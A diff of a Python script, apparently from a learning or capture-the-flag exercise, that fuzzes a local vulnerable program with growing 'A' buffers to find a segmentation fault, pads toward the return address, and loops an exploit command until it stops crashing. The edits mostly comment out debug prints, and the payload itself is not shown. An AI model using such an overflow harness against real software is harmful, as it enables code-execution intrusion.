@@ -45,7 +45,7 @@ while True:
     vuln_output, _ = vuln_proc.communicate(overflow)
 
     if vuln_proc.returncode == -11:
-        print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
+        # print(f"Segmentation fault occurred with buffer length: {len(overflow)}")
         #not sure why the program crashes at 136 bytes length, will add 4 bytes to the buffer to cover ebp and reach the return address location. Must change!
         overflow += b'A'*4
 
@@ -64,10 +64,25 @@ while True:
         i = 0
         while True:
             print(i)
-            exploit_proc = subprocess.Popen(exploit_command, shell=True)
-            retcode = exploit_proc.communicate()
+            exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=subprocess.PIPE)
+            # while exploit_proc.poll() is None:
+            #     print("process is running")
+            # while True:
+            #     output = exploit_proc.stdout.readline()
+            #     if output:
+            #         if b'AAAA' in output:
+            #             print(f"nopsled")
+            #             break
+            #         else:
+            #             print("in here")
+            #             print(output)
+
+            exploit_proc.communicate()
+            
             # Use wait() when you simply need to wait for the process to finish without interacting with its input/output streams.
+
             if(exploit_proc.returncode != 139):
+                # print(f"exploit proc return code: {exploit_proc.returncode}")
                 break
             i += 1
 
